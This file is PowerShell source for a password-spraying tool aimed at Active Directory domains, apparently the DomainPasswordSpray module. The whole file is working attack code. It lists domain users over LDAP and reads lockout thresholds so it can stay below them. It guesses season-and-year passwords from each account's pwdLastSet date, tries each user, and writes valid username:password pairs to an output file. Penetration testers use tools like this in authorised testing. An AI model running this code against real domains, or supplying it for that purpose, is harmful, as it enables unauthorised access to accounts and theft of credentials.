function Invoke-DomainPasswordSpray{
    <#
    .SYNOPSIS

    This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. Be careful not to lockout any accounts.

    DomainPasswordSpray Function: Invoke-DomainPasswordSpray
    Author: Beau Bullock (@dafthack) and Brian Fehrman (@fullmetalcache)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

    This module performs a password spray attack against users of a domain. By default it will automatically generate the userlist from the domain. Be careful not to lockout any accounts.

    .PARAMETER UserList

    Optional UserList parameter. This will be generated automatically if not specified.

    .PARAMETER Password

    A single password that will be used to perform the password spray.

    .PARAMETER PasswordList

    A list of passwords one per line to use for the password spray (Be very careful not to lockout accounts).

    .PARAMETER OutFile

    A file to output the results to.

    .PARAMETER Domain

    The domain to spray against.
    
    .PARAMETER Force
    
    Forces the spray to continue and doesn't prompt for confirmation.
    
    .PARAMETER PwdLastSet
    
    Use the Active Directory pwdLastSet attribute for the user to formulate a season or month and year based guess.
    
    .PARAMETER MonthYear
    
    When pwdLastSet is used, this identifies that the guess should be month/year instead of the default season/year format.
    
    .PARAMETER MonthFormat
    
    Valid values are Short/Long. Results in a password guess based on the pwdLastSet date with the month of the password change as the base word.
        
    .PARAMETER YearFormat
    
    Valid values are Short/Long. Results in year value represented in 2-digit and 4-digit format.
    
    .PARAMETER LowerCase
    
    When pwdLastSet is used, this forces the password to be formulated as lower case versus initial caps.
    
    .PARAMETER AppendChars
    
    When pwdLastSet is used, this identifies characters that should be appended to the guess.

    .EXAMPLE

    C:\PS> Invoke-DomainPasswordSpray -Password Winter2016

    Description
    -----------
    This command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password of Winter2016.

    .EXAMPLE

    C:\PS> Invoke-DomainPasswordSpray -UserList users.txt -Domain domain-name -PasswordList passlist.txt -OutFile sprayed-creds.txt

    Description
    -----------
    This command will use the userlist at users.txt and try to authenticate to the domain "domain-name" using each password in the passlist.txt file one at a time. It will automatically attempt to detect the domain's lockout observation window and restrict sprays to 1 attempt during each window.
    
    C:\PS> Invoke-DomainPasswordSpray -PwdLastSet -YearFormat Long -AppendChars "!" -Domain domain-name -OutFile sprayed-creds.txt
        
    Description
    -----------
    This command will automatically generate a list of users from the current user's domain and attempt to authenticate using each username and a password consisting of the season that the password was last changed (according to pwdLastSet) with the four digit year and the ! character appended.   


    #>
    Param(

     [Parameter(Position = 0, Mandatory = $false)]
     [string]
     $UserList = "",

     [Parameter(Position = 1, Mandatory = $false)]
     [string]
     $Password,

     [Parameter(Position = 2, Mandatory = $false)]
     [string]
     $PasswordList,

     [Parameter(Position = 3, Mandatory = $false)]
     [string]
     $OutFile,

     [Parameter(Position = 4, Mandatory = $false)]
     [string]
     $Domain = "",

     [Parameter(Position = 5, Mandatory = $false)]
     [switch]     
     $Force,
     
     # Added parameters to support use of pwdLastSet date information
     
     [Parameter(Position = 6, Mandatory = $false)]
     [switch]
     $PwdLastSet,
          
     [Parameter(Position = 7, Mandatory = $false)]
     [switch]
     $MonthYear,
     
     [Parameter(Position = 8, Mandatory = $false)]
     [ValidateSet('Short','Long')]
     [string]
     $MonthFormat = "Long",
     
     [Parameter(Position = 9, Mandatory = $false)]
     [ValidateSet('Short','Long')]
     [string]
     $YearFormat = "Long",

     [Parameter(Position = 11, Mandatory = $false)]
     [switch]
     $LowerCase,
     
     [Parameter(Position = 10, Mandatory = $false)]
     [string]
     $AppendChars = ""
     
    )
    
    if ($Domain -ne "")
    {
        Try 
        {
            #Using domain specified with -Domain option
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
            $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
        }
        catch 
        {
            Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try again specifying the domain name with the -Domain option."    
            break
        }
    }
    else 
    {
        Try 
        {
            #Trying to use the current user's domain
            $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
        }
        catch 
        {
            Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -Domain option."    
            break
        }
    }

    if ($UserList -eq "")
    {
        if ($PwdLastSet)
        {
            $UserListArray = Get-DomainUserList -PwdLastSet -Domain $Domain -RemoveDisabled -RemovePotentialLockouts
        }
        else
        {
            $UserListArray = Get-DomainUserList -Domain $Domain -RemoveDisabled -RemovePotentialLockouts        
        }
    }
    else
    {
        if ($PwdLastSet)
        {           
            Write-Host "[*] Using $UserList as userlist to spray with"
            Write-Host -ForegroundColor "yellow" "[*] Warning: Users will not be checked for lockout threshold." 
        }
        else
        {
            #if a Userlist is specified use it and do not check for lockout thresholds
            Write-Host "[*] Using $UserList as userlist to spray with"
            Write-Host -ForegroundColor "yellow" "[*] Warning: Users will not be checked for lockout threshold." 
            $UserListArray = @{}
            try 
            {
                $UserListArray = Get-Content $UserList -ErrorAction stop
            }
            catch [Exception]
            {
                Write-Host -ForegroundColor "red" "$_.Exception"
                break
            }
        
        }    
    }

    # If a single password is selected do this
    if ($Password)
    {
        #if no force flag is set we will ask if the user is sure they want to spray
        if (!$Force)
        {
            $title = "Confirm Password Spray"
            $message = "Are you sure you want to perform a password spray against " + $UserListArray.count + " accounts?"

            $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
                "Attempts to authenticate 1 time per user in the list."

            $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
                "Cancels the password spray."

            $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)

            $result = $host.ui.PromptForChoice($title, $message, $options, 0) 

            switch ($result)
            {
                0 
                {
                    $time = Get-Date
                    Write-Host -ForegroundColor Yellow "[*] Password spraying has begun. Current time is $($time.ToShortTimeString())"
                    Write-Host "[*] This might take a while depending on the total number of users"
                    $curr_user = 0
                    $count = $UserListArray.count

                    foreach ($User in $UserListArray){
                    $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
                        if ($Domain_check.name -ne $null)
                        {
                            if ($OutFile -ne "")
                            {    
                                Add-Content $OutFile $User`:$Password
                            }
                        Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
                        }
                        $curr_user+=1 
                        Write-Host -nonewline "$curr_user of $count users tested`r"
                        }
                    Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
                    if ($OutFile -ne "")
                    {
                    Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
                    }                
                }
                1 
                {
                    "Cancelling the password spray."
                }
            }
        }
        #If the force flag is set don't bother asking if we are sure we want to spray.
        if ($Force)
        {
            $time = Get-Date
            Write-Host -ForegroundColor Yellow "[*] Password spraying has begun. Current time is $($time.ToShortTimeString())"
            Write-Host "[*] This might take a while depending on the total number of users"
            $curr_user = 0
            $count = $UserListArray.count

            foreach ($User in $UserListArray){
                $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
                if ($Domain_check.name -ne $null)
                {
                    if ($OutFile -ne "")
                    {    
                        Add-Content $OutFile $User`:$Password
                    }
                    Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
                }
                $curr_user+=1 
                Write-Host -nonewline "$curr_user of $count users tested`r"
            }
            Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
        
            if ($OutFile -ne "")
            {
                Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
            }
        }        
    }
    # If pwdLastSet Style attack is selected, do this
    elseif ($PwdLastSet)
    {
        #if no force flag is set we will ask if the user is sure they want to spray
        if (!$Force)
        {
            $title = "Confirm Password Spray"
            $message = "Are you sure you want to perform a password spray against " + $UserListArray.count + " accounts?"

            $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
                "Attempts to authenticate 1 time per user in the list."

            $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
                "Cancels the password spray."

            $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)

            $result = $host.ui.PromptForChoice($title, $message, $options, 0) 

            switch ($result)
            {
                0 
                {
                    $time = Get-Date
                    Write-Host -ForegroundColor Yellow "[*] Password spraying has begun. Current time is $($time.ToShortTimeString())"
                    Write-Host "[*] This might take a while depending on the total number of users"
                    $curr_user = 0
                    $count = $UserListArray.count

                    foreach($kvp in $UserListArray.GetEnumerator())
                    {
                        $User = $kvp.Key
                        $pwdLastSetDate = $kvp.Value
                        
                        $password = ""
                        
                        # Check Month/Year variable to see if user wants to try the month of the last password change
                        if ($MonthYear)             
                        {
                            if ($MonthFormat -eq "Long")
                            {
                                $base = (Get-Culture).DateTimeFormat.GetMonthName($pwdLastSetDate.Month)
                            }
                            else
                            {
                                $base = (Get-Culture).DateTimeFormat.GetMonthName($pwdLastSetDate.Month).Substring(0,3)                            
                            }
                        }
                        # If Month/Year is not specified, then use Season/Year
                        else
                        {
                            # Calculate the password base word from the season that it was last changed
                            if (($pwdLastSetDate.Month -eq 12) -or ($pwdLastSetDate.Month -eq 1) -or ($pwdLastSetDate.Month -eq 2))
                            {
                                $base = "Winter"
                            }
                            elseif (($pwdLastSetDate.Month -eq 3) -or ($pwdLastSetDate.Month -eq 4) -or ($pwdLastSetDate.Month -eq 5))
                            {
                                $base = "Spring"
                            }
                            elseif (($pwdLastSetDate.Month -eq 6) -or ($pwdLastSetDate.Month -eq 7) -or ($pwdLastSetDate.Month -eq 8))
                            {
                                $base = "Summer"
                            }
                            else
                            {
                                $base = "Fall"
                            }
                        }
                            
                        # Put the year that the password was changed into the appropriate format (2-digit or 4-digit)
                        if ($YearFormat -eq "Long")
                        {
                            $year = $pwdLastSetDate.Year.ToString()
                        }
                        else
                        {
                            $year = $pwdLastSetDate.Year.ToString().SubString(2)
                        }
                          
                        # Send InitCaps password or LowerCase password based on InitCaps switch
                        if (!$LowerCase)
                        {
                            $password = $base + $year + $AppendChars
                        }
                        else
                        {
                            $password = $base.ToLower() + $year + $AppendChars
                        }                           
                        
                        $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
                        If ($Domain_check.name -ne $null)
                        {
                            if ($OutFile -ne "")
                            {    
                                Add-Content $OutFile $User`:$Password
                            }
                        Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
                        }
                        $curr_user+=1 
                        Write-Host -nonewline "$curr_user of $count users tested`r"
                        }
                    Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
                    if ($OutFile -ne "")
                    {
                    Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
                    }
                
                }
                1 {"Cancelling the password spray."}
            }
        }
        #If the force flag is set don't bother asking if we are sure we want to spray.
        if ($Force)
        {
            $time = Get-Date
            Write-Host -ForegroundColor Yellow "[*] Password spraying has begun. Current time is $($time.ToShortTimeString())"
            Write-Host "[*] This might take a while depending on the total number of users"
            $curr_user = 0
            $count = $UserListArray.count

            foreach($kvp in $UserListArray.GetEnumerator())
            {
                $User = $kvp.Key
                $pwdLastSetDate = $kvp.Value
                   
                $password = ""
                        
                # Check Month/Year variable to see if user wants to try the month of the last password change
                if ($MonthYear)             
                {
                    if ($MonthFormat -eq "Long")
                    {
                        $base = (Get-Culture).DateTimeFormat.GetMonthName($pwdLastSetDate.Month)
                    }
                    else
                    {
                        $base = (Get-Culture).DateTimeFormat.GetMonthName($pwdLastSetDate.Month).Substring(0,3)                            
                    }
                }
                # If Month/Year is not specified, then use Season/Year
                else
                {
                    # Calculate the password base word from the season that it was last changed
                    if (($pwdLastSetDate.Month -eq 12) -or ($pwdLastSetDate.Month -eq 1) -or ($pwdLastSetDate.Month -eq 2))
                    {
                        $base = "Winter"
                    }
                    elseif (($pwdLastSetDate.Month -eq 3) -or ($pwdLastSetDate.Month -eq 4) -or ($pwdLastSetDate.Month -eq 5))
                    {
                        $base = "Spring"
                    }
                    elseif (($pwdLastSetDate.Month -eq 6) -or ($pwdLastSetDate.Month -eq 7) -or ($pwdLastSetDate.Month -eq 8))
                    {
                       $base = "Summer"
                    }
                    else
                    {
                        $base = "Fall"
                    }
                }
                            
                # Put the year that the password was changed into the appropriate format (2-digit or 4-digit)
                if ($YearFormat -eq "Long")
                {
                    $year = $pwdLastSetDate.Year.ToString()
                }
                else
                {
                    $year = $pwdLastSetDate.Year.ToString().SubString(2)
                }
                          
                # Send LowerCase password based on presence of LowerCase switch
                if (!$LowerCase)
                {
                    $password = $base + $year + $AppendChars
                }
                else
                {
                    $password = $base.ToLower() + $year + $AppendChars
                }                           
                
                $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password)
                
                if ($Domain_check.name -ne $null)
                {
                    if ($OutFile -ne "")
                    {    
                        Add-Content $OutFile $User`:$Password
                    }
                    Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password"
                }
                $curr_user+=1 
                Write-Host -nonewline "$curr_user of $count users tested`r"
            }
            Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
            
            if ($OutFile -ne "")
            {
                Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
            }
        }       
    }   
    # If a password list is selected do this
    elseif($PasswordList)
    {
        $Passwords = Get-Content $PasswordList
        #Get account lockout observation window to avoid running more than 1 password spray per observation window.
        $net_accounts = "cmd.exe /C net accounts /domain"
        $net_accounts_results = Invoke-Expression -Command:$net_accounts
        $stripped_policy = ($net_accounts_results | Where-Object {$_ -like "*Lockout Observation Window*"}) 
        $stripped_split_a, $stripped_split_b = $stripped_policy.split(':',2)
        $observation_window_no_spaces = $stripped_split_b -Replace '\s+',""
        [int]$observation_window = [convert]::ToInt32($observation_window_no_spaces, 10)

        Write-Host -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"    
        Write-Host -ForegroundColor Yellow "[*] The domain password policy observation window is set to $observation_window minutes."
        Write-Host "[*] Setting a $observation_window minute wait in between sprays."
        
        #if no force flag is set we will ask if the user is sure they want to spray
        if (!$Force)
        {
            $title = "Confirm Password Spray"
            $message = "Are you sure you want to perform a password spray against " + $UserListArray.count + " accounts?"

            $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
                "Attempts to authenticate 1 time per user in the list for each password in the passwordlist file."

            $no = New-Object System.Management.Automation.Host.ChoiceDescription "&No", `
                "Cancels the password spray."

            $options = [System.Management.Automation.Host.ChoiceDescription[]]($yes, $no)

            $result = $host.ui.PromptForChoice($title, $message, $options, 0) 

            switch ($result)
            {
                0 
                {
                    Write-Host -ForegroundColor Yellow "[*] Password spraying has begun."
                    Write-Host "[*] This might take a while depending on the total number of users"

                    foreach ($Password_Item in $Passwords)
                    {
                        $time = Get-Date
                        Write-Host "[*] Now trying password $Password_Item. Current time is $($time.ToShortTimeString())"
                        $curr_user = 0
                        $count = $UserListArray.count

                        foreach ($User in $UserListArray)
                        {
                            $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password_Item)
                            if ($Domain_check.name -ne $null)
                            {
                                if ($OutFile -ne "")
                                {
                                    Add-Content $OutFile $User`:$Password_Item
                                }
                                Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password_Item"
                            }
                            $curr_user+=1 
                            Write-Host -nonewline "$curr_user of $count users tested`r"
                        }
                        Countdown-Timer -Seconds (60*$observation_window)
                    }
            
                    Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
            
                    if ($OutFile -ne "")
                    {
                        Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
                    }
                
                }
                1 
                {
                    "Cancelling the password spray."
                }
            }
        }
        #if the force flag is set we will not bother asking about proceeding with password spray.
        if($Force)
        {
            Write-Host -ForegroundColor Yellow "[*] Password spraying has begun."
            Write-Host "[*] This might take a while depending on the total number of users"

            foreach($Password_Item in $Passwords)
            {
                $time = Get-Date
                Write-Host "[*] Now trying password $Password_Item. Current time is $($time.ToShortTimeString())"
                $curr_user = 0
                $count = $UserListArray.count

                foreach($User in $UserListArray)
                {
                    $Domain_check = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain,$User,$Password_Item)
                    if ($Domain_check.name -ne $null)
                    {
                        if ($OutFile -ne "")
                        {
                            Add-Content $OutFile $User`:$Password_Item
                        }
                        Write-Host -ForegroundColor Green "[*] SUCCESS! User:$User Password:$Password_Item"
                    }
                    $curr_user+=1 
                    Write-Host -nonewline "$curr_user of $count users tested`r"
                }
                Countdown-Timer -Seconds (60*$observation_window)
            }
            Write-Host -ForegroundColor Yellow "[*] Password spraying is complete"
            
            if ($OutFile -ne "")
            {
                Write-Host -ForegroundColor Yellow "[*] Any passwords that were successfully sprayed have been output to $OutFile"
            }                
        }
    }
    Else
    {
        Write-Host -ForegroundColor Red "The -Password, -PasswordList, or -PwdLastSet option must be specified"
        break
    }
}

Function Countdown-Timer
{   
    Param(
        $Seconds = 1800,
        $Message = "[*] Pausing to avoid account lockout."
    )
    foreach ($Count in (1..$Seconds))
    {   
        Write-Progress -Id 1 -Activity $Message -Status "Waiting for $($Seconds/60) minutes. $($Seconds - $Count) seconds remaining" -PercentComplete (($Count / $Seconds) * 100)
        Start-Sleep -Seconds 1
    }
    Write-Progress -Id 1 -Activity $Message -Status "Completed" -PercentComplete 100 -Completed
}

Function Get-DomainUserList
{

<#
    .SYNOPSIS

    This module gathers a userlist from the domain.
    
    DomainPasswordSpray Function: Get-DomainUserList
    Author: Beau Bullock (@dafthack)
    License: BSD 3-Clause
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

    This module gathers a userlist from the domain.

    .PARAMETER Domain

    The domain to spray against.

    .PARAMETER RemoveDisabled

    Attempts to remove disabled accounts from the userlist. (Credit to Sally Vandeven (@sallyvdv))   
    
    .PARAMETER RemovePotentialLockouts
    
    Removes accounts within 1 attempt of locking out.
    
    .PARAMETER PwdLastSet
    
    Returns the PwdLastSet date along with the samAccountName in a HashTable instead of an array. 
    
    .EXAMPLE

    C:\PS> Get-DomainUserList

    Description
    -----------
    This command will gather a userlist from the domain including all samAccountType "805306368".
    
    .EXAMPLE

    C:\PS> Get-DomainUserList -Domain domainname -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt

    Description
    -----------
    This command will gather a userlist from the domain "domainname" including any accounts that are not disabled and are not close to locking out. It will write them to a file at "userlist.txt"
    
    #>
    Param(
     [Parameter(Position = 0, Mandatory = $false)]
     [string]
     $Domain = "",
     
     [Parameter(Position = 1, Mandatory = $false)]
     [switch]
     $RemoveDisabled,
     
     [Parameter(Position = 2, Mandatory = $false)]
     [switch]
     $RemovePotentialLockouts,
     
     [Parameter(Position = 3, Mandatory = $false)]
     [switch]
     $PwdLastSet
    )
    
   if ($Domain -ne "")
    {
        Try 
        {
            #Using domain specified with -Domain option
            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext("domain",$Domain)
            $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
            $CurrentDomain = "LDAP://" + ([ADSI]"LDAP://$Domain").distinguishedName
        }
        catch 
        {
            Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try again specifying the domain name with the -Domain option."    
            break
        }
    }
    else 
    {
        Try 
        {
            #Trying to use the current user's domain
            $DomainObject =[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName
        }
        catch 
        {
            Write-Host -ForegroundColor "red" "[*] Could connect to the domain. Try specifying the domain name with the -Domain option."    
            break
        }
    }

    #Setting the current domain's account lockout threshold
    $objDeDomain = [ADSI] "LDAP://$($DomainObject.PDCRoleOwner)"
    $AccountLockoutThresholds = @()
    $AccountLockoutThresholds += $objDeDomain.Properties.lockoutthreshold

    #Getting the AD behavior version to determine if fine-grained password policies are possible
    $behaviorversion = [int] $objDeDomain.Properties['msds-behavior-version'].item(0)
    if ($behaviorversion -ge 3)
    {
        #Determine if there are any fine-grained password policies
        Write-Host "[*] Current domain is compatible with Fine-Grained Password Policy."
        $ADSearcher = New-Object System.DirectoryServices.DirectorySearcher
        $ADSearcher.SearchRoot = $objDeDomain
        $ADSearcher.Filter = "(objectclass=msDS-PasswordSettings)"
        $PSOs = $ADSearcher.FindAll()

        if ( $PSOs.count -gt 0)
        {
            Write-Host -foregroundcolor "yellow" ("[*] A total of " + $PSOs.count + " Fine-Grained Password policies were found.`r`n")
            foreach($entry in $PSOs)
            {
                #Selecting the lockout threshold, min pwd length, and which groups the fine-grained password policy applies to
                $PSOFineGrainedPolicy = $entry | Select-Object -ExpandProperty Properties
                $PSOPolicyName = $PSOFineGrainedPolicy.name
                $PSOLockoutThreshold = $PSOFineGrainedPolicy.'msds-lockoutthreshold'
                $PSOAppliesTo = $PSOFineGrainedPolicy.'msds-psoappliesto'
                $PSOMinPwdLength = $PSOFineGrainedPolicy.'msds-minimumpasswordlength'
                #adding lockout threshold to array for use later to determine which is the lowest.
                $AccountLockoutThresholds += $PSOLockoutThreshold

            Write-Host "[*] Fine-Grained Password Policy titled: $PSOPolicyName has a Lockout Threshold of $PSOLockoutThreshold attempts, minimum password length of $PSOMinPwdLength chars, and applies to $PSOAppliesTo.`r`n"
            }
        }

    }

        #Get account lockout observation window to avoid running more than 1 password spray per observation window.
        $net_accounts = "cmd.exe /C net accounts /domain"
        $net_accounts_results = Invoke-Expression -Command:$net_accounts
        $stripped_policy = ($net_accounts_results | Where-Object {$_ -like "*Lockout Observation Window*"}) 
        $stripped_split_a, $stripped_split_b = $stripped_policy.split(':',2)
        $observation_window_no_spaces = $stripped_split_b -Replace '\s+',""
        [int]$observation_window = [convert]::ToInt32($observation_window_no_spaces, 10)

        #Generate a userlist from the domain
        #Selecting the lowest account lockout threshold in the domain to avoid locking out any accounts. 
        [int]$SmallestLockoutThreshold = $AccountLockoutThresholds | sort | Select -First 1
        Write-Host -ForegroundColor "yellow" "[*] Now creating a list of users to spray..."
        
        if ($SmallestLockoutThreshold -eq "0")
        {
            Write-Host -ForegroundColor "Yellow" "[*] There appears to be no lockout policy."
        }
        else
        {
            Write-Host -ForegroundColor "Yellow" "[*] The smallest lockout threshold discovered in the domain is $SmallestLockoutThreshold login attempts."
        }
        
        $UserSearcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$CurrentDomain)
        $DirEntry = New-Object System.DirectoryServices.DirectoryEntry
        $UserSearcher.SearchRoot = $DirEntry

        $UserSearcher.PropertiesToLoad.Add("samaccountname") > $Null
        $UserSearcher.PropertiesToLoad.Add("badpwdcount") > $Null
        $UserSearcher.PropertiesToLoad.Add("badpasswordtime") > $Null
        if ($pwdLastSet)
        {
            $UserSearcher.PropertiesToLoad.Add("pwdlastset") > $Null
        }
        
        If ($RemoveDisabled){
                Write-Host -ForegroundColor "yellow" "[*] Removing disabled users from list."
                # more precise LDAP filter UAC check for users that are disabled (Joff Thyer)
                $UserSearcher.filter = "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2))"
        }
        else
        {
                $UserSearcher.filter = "(&(objectCategory=person)(objectClass=user))"
        }

        # grab batches of 1000 in results
        $UserSearcher.PageSize = 1000
        $AllUserObjects = $UserSearcher.FindAll()
        Write-Host -ForegroundColor "yellow" ("[*] There are " + $AllUserObjects.count + " total users found.")
        
        if ($PwdLastSet)
        {
            # converted $UserListArray to a hashtable to accomodate collection of pwdLastSet dates
            $UserListArray = @{} 
        
            If ($RemovePotentialLockouts)
            {
                Write-Host -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out from list."
                Foreach ($user in $AllUserObjects)
                {
                    #Getting bad password counts and lst bad password time for each user
                    $badcount = $user.Properties.badpwdcount
                    $samaccountname = $user.Properties.samaccountname
                    $pwdlastsetdate = $user.Properties.pwdlastset[0]
                    try
                    {
                        $badpasswordtime = $user.Properties.badpasswordtime[0]
                    }
                    catch
                    {
                        continue
                    }
                    $currenttime = Get-Date
                    $lastbadpwd = [DateTime]::FromFileTime($badpasswordtime)
                    $timedifference = ($currenttime - $lastbadpwd).TotalMinutes

                    if ($badcount)
                    {
                    
                        [int]$userbadcount = [convert]::ToInt32($badcount, 10)
                        $attemptsuntillockout = $SmallestLockoutThreshold - $userbadcount   
                        #if there is more than 1 attempt left before a user locks out or if the time since the last failed login is greater than the domain observation window add user to spray list
                        if (($timedifference -gt $observation_window) -Or ($attemptsuntillockout -gt 1))
                        {
                            $UserListArray.add($samaccountname,[DateTime]::FromFileTime($pwdlastsetdate))
                        }
                    }
                }
            }
            else
            {
                foreach ($user in $AllUserObjects)
                {
                    $samaccountname = $user.Properties.samaccountname
                    $pwdlastset = $user.Properties.pwdlastset
                    $UserListArray.add($samaccountname,[DateTime]::FromFileTime($pwdlastsetdate))
                }
            }
        }
        else
        {
            # converted $UserListArray to a hashtable to accomodate collection of pwdLastSet dates
            $UserListArray = @() 
        
            If ($RemovePotentialLockouts)
            {
                Write-Host -ForegroundColor "yellow" "[*] Removing users within 1 attempt of locking out from list."
                Foreach ($user in $AllUserObjects)
                {
                    #Getting bad password counts and lst bad password time for each user
                    $badcount = $user.Properties.badpwdcount
                    $samaccountname = $user.Properties.samaccountname
                    try
                    {
                        $badpasswordtime = $user.Properties.badpasswordtime[0]
                    }
                    catch
                    {
                        continue
                    }
                    $currenttime = Get-Date
                    $lastbadpwd = [DateTime]::FromFileTime($badpasswordtime)
                    $timedifference = ($currenttime - $lastbadpwd).TotalMinutes

                    if ($badcount)
                    {
                    
                        [int]$userbadcount = [convert]::ToInt32($badcount, 10)
                        $attemptsuntillockout = $SmallestLockoutThreshold - $userbadcount   
                        #if there is more than 1 attempt left before a user locks out or if the time since the last failed login is greater than the domain observation window add user to spray list
                        if (($timedifference -gt $observation_window) -Or ($attemptsuntillockout -gt 1))
                        {
                            $UserListArray += $samaccountname
                        }
                    }
                }
            }
            else
            {
                foreach ($user in $AllUserObjects)
                {
                    $samaccountname = $user.Properties.samaccountname
                    $UserListArray += $samaccountname
                }
            }       
        }
        
        Write-Host -foregroundcolor "yellow" ("[*] Created a userlist containing " + $UserListArray.count + " users gathered from the current user's domain")
        return $UserListArray
    }
